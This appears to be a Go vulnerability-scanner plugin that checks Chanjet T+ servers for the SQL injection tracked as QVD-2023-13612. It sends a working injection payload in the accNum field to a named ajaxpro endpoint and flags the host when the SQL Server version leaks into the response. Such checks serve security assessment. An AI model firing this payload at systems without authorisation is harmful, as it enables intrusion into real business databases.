package chanjetTplus

import (
	"fmt"
	"github.com/veo/vscan/pkg"
	"strings"
)

func QVD_2023_13612_SQL(u string) bool {
	data := "{\"accNum\": \"3'and (select @@version)>0--\", \"functionTag\": \"SYS0104\", \"url\": \"\"}"
	if req, err := pkg.HttpRequset(u+"/tplus/ajaxpro/Ufida.T.SM.UIP.MultiCompanyController,Ufida.T.SM.UIP.ashx?method=CheckMutex", "POST", data, false, nil); err == nil {
		if strings.Contains(req.Body, "Microsoft SQL Server") && req.StatusCode == 200 {
			pkg.GoPocLog(fmt.Sprintf("Found chanjetTplus QVD_2023_13612_SQL|--\"%s\"\n", u))
			return true
		}
	}
	return false
}
